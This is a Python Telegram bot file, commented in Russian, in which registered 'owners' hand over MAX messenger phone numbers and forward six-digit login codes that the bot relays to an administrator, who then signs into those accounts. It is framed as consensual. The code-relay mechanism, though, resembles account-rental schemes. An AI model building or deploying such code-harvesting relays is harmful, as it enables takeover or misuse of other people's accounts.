"""
Telegram-бот: владелец регистрирует номер MAX, админ запрашивает код входа,
владелец добровольно отправляет код — бот пересылает админу.
"""

from __future__ import annotations

import asyncio
import logging
import os
import re

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from dotenv import load_dotenv

from storage import CodeRequest, Store, normalize_phone

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
)
log = logging.getLogger("telegram-max-relay")

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_PROXY = os.getenv("TELEGRAM_PROXY", "").strip() or None


def _parse_ids(raw: str) -> set[int]:
    ids: set[int] = set()
    for part in raw.replace(";", ",").split(","):
        part = part.strip()
        if part.isdigit():
            ids.add(int(part))
    return ids


ADMIN_IDS = _parse_ids(os.getenv("ADMIN_USER_IDS", ""))
OWNER_WHITELIST = _parse_ids(os.getenv("OWNER_USER_IDS", ""))

store = Store()
router = Router()

CODE_LEN = 6
PHONE_HINT = "Только номер России: +79991234567 (11 цифр, начинается с +7)"


class OwnerRegister(StatesGroup):
    waiting_phone = State()


class OwnerSendCode(StatesGroup):
    waiting_code = State()


def is_admin(user_id: int | None) -> bool:
    return user_id is not None and user_id in ADMIN_IDS


def can_be_owner(user_id: int | None) -> bool:
    if user_id is None:
        return False
    if not OWNER_WHITELIST:
        return True
    return user_id in OWNER_WHITELIST


# Тексты кнопок меню (обрабатываются как нажатия)
BTN_OWNERS = "📋 Владельцы"
BTN_REQUEST = "🔐 Запросить код"
BTN_CANCEL = "❌ Отменить"
BTN_REGISTER = "Сдать номер📱"
BTN_DECLINE = "🚫 Отказаться"
BTN_MENU = "🏠 Меню"

MENU_BUTTONS = {
    BTN_OWNERS,
    BTN_REQUEST,
    BTN_CANCEL,
    BTN_REGISTER,
    BTN_DECLINE,
    BTN_MENU,
}


def parse_code(raw: str) -> str | None:
    digits = re.sub(r"\D", "", raw.strip())
    if len(digits) == CODE_LEN and digits.isdigit():
        return digits
    return None


def main_menu_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    rows: list[list[KeyboardButton]] = []

    if is_admin(user_id):
        rows.append(
            [
                KeyboardButton(text=BTN_OWNERS),
                KeyboardButton(text=BTN_REQUEST),
            ]
        )
        rows.append([KeyboardButton(text=BTN_CANCEL)])

    if can_be_owner(user_id):
        rows.append([KeyboardButton(text=BTN_REGISTER)])
        if store.get_pending(user_id):
            rows.append([KeyboardButton(text=BTN_DECLINE)])

    rows.append([KeyboardButton(text=BTN_MENU)])

    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True)


def contact_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )


def format_owners_list() -> str:
    people = len(store.owners)
    total = store.total_phones()
    lines = [
        f"📋 **Владельцы**\n"
        f"Людей: **{people}** · Номеров: **{total}**\n"
    ]
    for i, o in enumerate(store.owners.values(), 1):
        pending = " ⏳ ждёт код" if store.get_pending(o.user_id) else ""
        uname = f" @{o.username}" if o.username else ""
        lines.append(
            f"\n**{i}. {o.name or 'Без имени'}**{uname}{pending}\n"
            f"ID: `{o.user_id}` · номеров: **{len(o.phones)}**"
        )
        for phone in o.phones:
            lines.append(f"  • `{phone}`")
    lines.append("\n🔐 Нажмите кнопку под сообщением, чтобы запросить код.")
    return "\n".join(lines)


def owners_request_inline() -> InlineKeyboardMarkup | None:
    if not store.owners:
        return None
    buttons: list[list[InlineKeyboardButton]] = []
    for o in store.owners.values():
        label = (o.name or str(o.user_id))[:20]
        for phone in o.phones:
            buttons.append(
                [
                    InlineKeyboardButton(
                        text=f"🔐 {mask_phone(phone)} — {label}",
                        callback_data=f"req:{phone}",
                    )
                ]
            )
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def mask_phone(phone: str) -> str:
    if len(phone) < 8:
        return phone
    return phone[:4] + " *** " + phone[-2:]


@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext) -> None:
    await state.clear()
    uid = message.from_user.id if message.from_user else 0

    if is_admin(uid):
        await message.answer(
            "Вы — **администратор**.\n\n"
            "Используйте кнопки ниже или команды:\n"
            "📋 Владельцы · 🔐 Запросить код · ❌ Отменить · 🏠 Меню",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(uid),
        )
        return

    if can_be_owner(uid):
        await message.answer(
            "Сдать номер📱 — привязать номер MAX (+7...)\n\n"
            f"Когда админ запросит код — пришлите **{CODE_LEN} цифр** (например 123456).",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(uid),
        )
        if uid in store.owners:
            o = store.owners[uid]
            phones = "\n".join(f"  • {mask_phone(p)}" for p in o.phones)
            await message.answer(
                f"Ваши номера ({len(o.phones)}):\n{phones}",
                reply_markup=main_menu_keyboard(uid),
            )
        return

    await message.answer(
        "Бот для передачи кода входа в MAX между владельцем и администратором.\n"
        "У вас нет доступа. Обратитесь к администратору."
    )


@router.message(Command("register"))
async def cmd_register(message: Message, state: FSMContext) -> None:
    uid = message.from_user.id if message.from_user else 0
    if not can_be_owner(uid):
        await message.answer("Регистрация владельцев отключена для вашего аккаунта.")
        return

    await state.set_state(OwnerRegister.waiting_phone)
    await message.answer(
        "Отправьте номер телефона, привязанный к аккаунту MAX:\n"
        "• кнопкой ниже, или\n"
        f"• текстом: {PHONE_HINT}",
        reply_markup=contact_keyboard(),
    )


@router.message(OwnerRegister.waiting_phone, F.contact)
async def register_contact(message: Message, state: FSMContext) -> None:
    contact = message.contact
    if not contact or not contact.phone_number:
        await message.answer("Не удалось прочитать номер. Попробуйте ещё раз.")
        return
    phone = normalize_phone(contact.phone_number)
    if not phone:
        await message.answer(PHONE_HINT)
        return
    await _finish_register(message, state, phone)


@router.message(OwnerRegister.waiting_phone, F.text)
async def register_text(message: Message, state: FSMContext) -> None:
    if not message.text:
        return
    phone = normalize_phone(message.text)
    if not phone:
        await message.answer(
            PHONE_HINT,
            reply_markup=contact_keyboard(),
        )
        return
    await _finish_register(message, state, phone)


async def _finish_register(message: Message, state: FSMContext, phone: str) -> None:
    user = message.from_user
    if not user:
        return

    existing = store.owner_by_phone(phone)
    if existing and existing.user_id != user.id:
        await message.answer(
            "Этот номер уже зарегистрирован другим пользователем. "
            "Обратитесь к администратору.",
            reply_markup=ReplyKeyboardRemove(),
        )
        await state.clear()
        return

    owner, already = store.register_owner(
        user.id,
        phone,
        name=user.full_name,
        username=user.username,
    )
    await state.clear()
    if already:
        await message.answer(
            f"Номер {mask_phone(phone)} уже в вашем списке.\n"
            f"Всего номеров: {len(owner.phones)}",
            reply_markup=main_menu_keyboard(user.id),
        )
        return

    await message.answer(
        f"Номер {mask_phone(phone)} сохранён.\n"
        f"Всего ваших номеров: {len(owner.phones)}\n"
        "Когда админ запросит код входа в MAX, вы получите уведомление.",
        reply_markup=main_menu_keyboard(user.id),
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(
                admin_id,
                f"Новый номер: {user.full_name or user.id}\n"
                f"Телефон: {phone}\n"
                f"Всего у человека: {len(owner.phones)} · ID: `{user.id}`",
                parse_mode="Markdown",
            )
        except Exception:
            log.warning("Не удалось уведомить админа %s", admin_id)


@router.message(Command("owners"))
async def cmd_owners(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        await message.answer("Команда только для администратора.")
        return

    if not store.owners:
        await message.answer(
            "Владельцев пока нет. Попросите нажать «Сдать номер📱».",
            reply_markup=main_menu_keyboard(message.from_user.id if message.from_user else 0),
        )
        return

    kb = owners_request_inline()
    await message.answer(
        format_owners_list(),
        parse_mode="Markdown",
        reply_markup=kb,
    )


async def _do_request(
    bot: Bot, admin_id: int, phone: str, reply_to: Message | None = None
) -> bool:
    owner = store.owner_by_phone(phone)
    if not owner:
        text = (
            f"Владелец с номером {phone} не зарегистрирован.\n"
            "Попросите нажать «Сдать номер📱»"
        )
        if reply_to:
            await reply_to.answer(text, reply_markup=main_menu_keyboard(admin_id))
        return False

    if store.get_pending(owner.user_id):
        text = "По этому владельцу уже есть активный запрос кода."
        if reply_to:
            await reply_to.answer(text, reply_markup=main_menu_keyboard(admin_id))
        return False

    store.set_pending(
        CodeRequest(owner_id=owner.user_id, admin_id=admin_id, phone=phone)
    )

    text = (
        f"Запрос отправлен владельцу {owner.name or owner.user_id} "
        f"({mask_phone(phone)}).\n\n"
        f"Запустите вход в MAX на этот номер. "
        f"Когда владелец пришлёт код — он появится здесь."
    )
    if reply_to:
        await reply_to.answer(text, reply_markup=main_menu_keyboard(admin_id))

    try:
        await bot.send_message(
            owner.user_id,
            "🔐 **Запрос кода входа в MAX**\n\n"
            f"Администратор запрашивает код для номера `{phone}`.\n\n"
            "1. Если вы согласны — дождитесь SMS/кода от MAX\n"
            f"2. Отправьте код — ровно **{CODE_LEN} цифр** в этот чат\n"
            "3. Отказ: кнопка 🚫 Отказаться",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(owner.user_id),
        )
    except Exception:
        log.exception("Не удалось написать владельцу %s", owner.user_id)
        store.clear_pending(owner.user_id)
        if reply_to:
            await reply_to.answer(
                "Не удалось связаться с владельцем в Telegram.",
                reply_markup=main_menu_keyboard(admin_id),
            )
        return False
    return True


@router.callback_query(F.data.startswith("req:"))
async def cb_request_code(callback: CallbackQuery, bot: Bot) -> None:
    if not callback.from_user or not is_admin(callback.from_user.id):
        await callback.answer("Только для администратора", show_alert=True)
        return

    phone = normalize_phone((callback.data or "").removeprefix("req:"))
    if not phone:
        await callback.answer("Некорректный номер", show_alert=True)
        return

    ok = await _do_request(bot, callback.from_user.id, phone, None)
    if not ok:
        await callback.answer("Не удалось отправить запрос", show_alert=True)
        return

    await callback.answer("Запрос отправлен")
    if callback.message:
        await callback.message.answer(
            f"Запрос кода для {mask_phone(phone)} отправлен.",
            reply_markup=main_menu_keyboard(callback.from_user.id),
        )


@router.message(Command("request"))
async def cmd_request(message: Message, command: CommandObject, bot: Bot) -> None:
    admin_id = message.from_user.id if message.from_user else None
    if not is_admin(admin_id):
        await message.answer("Команда только для администратора.")
        return

    if not command.args:
        kb = owners_request_inline()
        if kb:
            await message.answer(
                "Выберите владельца или укажите номер:\n`/request +79991234567`",
                parse_mode="Markdown",
                reply_markup=kb,
            )
        else:
            await message.answer(
                "Владельцев пока нет. Попросите нажать «Сдать номер📱».",
                reply_markup=main_menu_keyboard(admin_id or 0),
            )
        return

    phone = normalize_phone(command.args.strip())
    if not phone:
        await message.answer("Некорректный номер.")
        return

    await _do_request(bot, admin_id or 0, phone, message)


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext) -> None:
    await state.clear()
    uid = message.from_user.id if message.from_user else None

    if is_admin(uid):
        cancelled = 0
        for owner_id, req in list(store.pending.items()):
            if req.admin_id == uid:
                store.clear_pending(owner_id)
                cancelled += 1
                try:
                    await message.bot.send_message(
                        owner_id,
                        "Администратор отменил запрос кода.",
                    )
                except Exception:
                    pass
        await message.answer(
            f"Отменено запросов: {cancelled}" if cancelled else "Активных запросов нет.",
            reply_markup=main_menu_keyboard(uid or 0),
        )
        return

    req = store.clear_pending(uid or 0)
    if req:
        await message.answer(
            "Ваш запрос кода отменён.",
            reply_markup=main_menu_keyboard(uid or 0),
        )
        try:
            await message.bot.send_message(req.admin_id, "Владелец отменил передачу кода.")
        except Exception:
            pass
    else:
        await message.answer(
            "Нет активного запроса.",
            reply_markup=main_menu_keyboard(uid or 0),
        )


@router.message(Command("decline"))
async def cmd_decline(message: Message) -> None:
    uid = message.from_user.id if message.from_user else 0
    req = store.clear_pending(uid)
    if not req:
        await message.answer("Нет активного запроса.")
        return
    await message.answer(
        "Вы отказались передавать код.",
        reply_markup=main_menu_keyboard(uid),
    )
    try:
        await message.bot.send_message(
            req.admin_id,
            f"Владелец {uid} отказался передавать код для {mask_phone(req.phone)}.",
        )
    except Exception:
        pass


@router.message(Command("code"))
async def cmd_code(message: Message, command: CommandObject, bot: Bot) -> None:
    uid = message.from_user.id if message.from_user else 0
    req = store.get_pending(uid)
    if not req:
        await message.answer("Сейчас нет запроса кода. Ждите уведомление от админа.")
        return

    if not command.args:
        await message.answer(f"Пример: /code {'1' * CODE_LEN}")
        return

    code = parse_code(command.args)
    if not code:
        await message.answer(f"Код должен состоять ровно из {CODE_LEN} цифр.")
        return

    await _deliver_code(message, bot, req, code)


@router.message(F.text.in_(MENU_BUTTONS))
async def on_menu_button(message: Message, state: FSMContext, bot: Bot) -> None:
    await state.clear()
    uid = message.from_user.id if message.from_user else 0
    text = message.text or ""

    if text == BTN_MENU:
        await cmd_start(message, state)
        return
    if text == BTN_OWNERS and is_admin(uid):
        await cmd_owners(message)
        return
    if text == BTN_REQUEST and is_admin(uid):
        kb = owners_request_inline()
        if kb:
            await message.answer("Выберите номер для запроса кода:", reply_markup=kb)
        else:
            await message.answer(
                "Владельцев пока нет. Попросите нажать «Сдать номер📱».",
                reply_markup=main_menu_keyboard(uid),
            )
        return
    if text == BTN_CANCEL:
        await cmd_cancel(message, state)
        return
    if text == BTN_REGISTER and can_be_owner(uid):
        await cmd_register(message, state)
        return
    if text == BTN_DECLINE:
        await cmd_decline(message)
        return

    await message.answer("Команда недоступна.", reply_markup=main_menu_keyboard(uid))


@router.message(F.text)
async def on_text(message: Message, bot: Bot, state: FSMContext) -> None:
    if await state.get_state():
        return

    uid = message.from_user.id if message.from_user else 0
    req = store.get_pending(uid)
    if not req or not message.text:
        if is_admin(uid) or can_be_owner(uid):
            await message.answer(
                "Используйте кнопки меню ниже 👇",
                reply_markup=main_menu_keyboard(uid),
            )
        return

    code = parse_code(message.text)
    if not code:
        await message.answer(
            f"Код должен состоять ровно из {CODE_LEN} цифр (например 123456).\n"
            "Отказ: 🚫 Отказаться"
        )
        return

    await _deliver_code(message, bot, req, code)


async def _deliver_code(
    message: Message, bot: Bot, req: CodeRequest, code: str
) -> None:
    owner = store.owners.get(req.owner_id)
    owner_name = owner.name if owner else str(req.owner_id)

    store.clear_pending(req.owner_id)

    uid = message.from_user.id if message.from_user else 0
    await message.answer(
        "Код передан администратору. Спасибо!",
        reply_markup=main_menu_keyboard(uid),
    )

    try:
        await bot.send_message(
            req.admin_id,
            "✅ **Код от владельца**\n\n"
            f"Владелец: {owner_name}\n"
            f"Номер: `{req.phone}`\n"
            f"Код: `{code}`\n\n"
            "_Используйте только с согласия владельца._",
            parse_mode="Markdown",
        )
    except Exception:
        log.exception("Не удалось отправить код админу %s", req.admin_id)
        await message.answer("Ошибка доставки админу. Напишите администратору вручную.")


async def main() -> None:
    if not BOT_TOKEN:
        raise SystemExit("Задайте TELEGRAM_BOT_TOKEN в .env")
    if not ADMIN_IDS:
        raise SystemExit("Задайте ADMIN_USER_IDS в .env (ваш Telegram ID)")

    session = AiohttpSession(proxy=TELEGRAM_PROXY) if TELEGRAM_PROXY else AiohttpSession()
    bot = Bot(token=BOT_TOKEN, session=session)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    if TELEGRAM_PROXY:
        log.info("Используется прокси для Telegram API")
    log.info("Бот запущен. Админы: %s", ADMIN_IDS)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
